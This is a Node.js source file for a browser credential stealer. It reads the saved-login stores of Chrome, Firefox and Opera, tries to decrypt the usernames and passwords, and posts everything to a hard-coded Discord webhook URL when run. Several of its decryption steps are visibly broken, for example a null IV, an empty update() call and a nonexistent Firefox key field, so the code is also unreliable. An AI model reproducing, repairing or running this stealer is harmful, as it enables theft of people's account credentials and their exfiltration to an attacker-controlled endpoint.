const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const axios = require('axios');

// Helpers
function decryptPassword(encryptedPassword, key) {
    try {
        const iv = encryptedPassword.slice(3, 15);
        const encryptedData = encryptedPassword.slice(15);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(encryptedData.slice(-16));
        const decrypted = Buffer.concat([decipher.update(encryptedData.slice(0, -16)), decipher.final()]);
        return decrypted.toString('utf-8');
    } catch (error) {
        console.error("Error decrypting password:", error.message);
        return '';
    }
}

// Chrome Passwords
async function getChromePasswords() {
    const results = [];
    try {
        const localStatePath = path.join(process.env.USERPROFILE, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State');
        const loginDbPath = path.join(process.env.USERPROFILE, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');

        const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf-8'));
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
        const decryptedKey = crypto.createDecipheriv('aes-256-gcm', encryptedKey, null).update();

        const tempFile = 'ChromeData.db';
        fs.copyFileSync(loginDbPath, tempFile);

        const db = new sqlite3.Database(tempFile);
        db.each("SELECT origin_url, username_value, password_value FROM logins", (err, row) => {
            if (err) throw err;
            const decryptedPassword = decryptPassword(row.password_value, decryptedKey);
            results.push(`URL: ${row.origin_url} | USERNAME: ${row.username_value} | PASSWORD: ${decryptedPassword}`);
        }, () => {
            db.close();
            fs.unlinkSync(tempFile);
        });
    } catch (error) {
        console.error("Error retrieving Chrome passwords:", error.message);
    }
    return results;
}

// Firefox Passwords
async function getFirefoxPasswords() {
    const results = [];
    try {
        const profileDir = path.join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles');
        const profiles = fs.readdirSync(profileDir).filter(folder => folder.endsWith('.default'));
        if (profiles.length === 0) throw new Error("No default profile found.");

        const loginDataPath = path.join(profileDir, profiles[0], 'logins.json');
        const logins = JSON.parse(fs.readFileSync(loginDataPath, 'utf-8')).logins;

        logins.forEach(login => {
            const decryptedUsername = decryptPassword(Buffer.from(login.encryptedUsername, 'base64'), login.key);
            const decryptedPassword = decryptPassword(Buffer.from(login.encryptedPassword, 'base64'), login.key);
            results.push(`URL: ${login.originUrl} | USERNAME: ${decryptedUsername} | PASSWORD: ${decryptedPassword}`);
        });
    } catch (error) {
        console.error("Error retrieving Firefox passwords:", error.message);
    }
    return results;
}

// Opera Passwords
async function getOperaPasswords() {
    const results = [];
    try {
        const operaDir = path.join(process.env.USERPROFILE, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable');
        const loginDbPath = path.join(operaDir, 'Login Data');

        const tempFile = 'OperaData.db';
        fs.copyFileSync(loginDbPath, tempFile);

        const db = new sqlite3.Database(tempFile);
        db.each("SELECT origin_url, username_value, password_value FROM logins", (err, row) => {
            if (err) throw err;
            const decryptedPassword = decryptPassword(row.password_value, '');
            results.push(`URL: ${row.origin_url} | USERNAME: ${row.username_value} | PASSWORD: ${decryptedPassword}`);
        }, () => {
            db.close();
            fs.unlinkSync(tempFile);
        });
    } catch (error) {
        console.error("Error retrieving Opera passwords:", error.message);
    }
    return results;
}

// Send to Discord Webhook
async function sendToDiscord(webhookUrl, credentials) {
    try {
        const formattedMessage = credentials.join('\n');
        await axios.post(webhookUrl, {
            content: `\`\`\`\n${formattedMessage}\n\`\`\``
        });
        console.log("Passwords sent to Discord webhook successfully.");
    } catch (error) {
        console.error("Error sending to Discord webhook:", error.message);
    }
}

// Main Function
(async function main() {
    const webhookUrl = 'https://discord.com/api/webhooks/1313201289487712296/XL2wZW456qmnaHE1HKdSqohHhlqccRUYbiPDZLmr5Y_uaX76GUXeCbbmfjS1INNsTjei'; // Replace with your webhook URL

    const chromePasswords = await getChromePasswords();
    const firefoxPasswords = await getFirefoxPasswords();
    const operaPasswords = await getOperaPasswords();

    const allCredentials = [...chromePasswords, ...firefoxPasswords, ...operaPasswords];
    if (allCredentials.length > 0) {
        await sendToDiscord(webhookUrl, allCredentials);
    } else {
        console.log("No credentials found.");
    }
})();
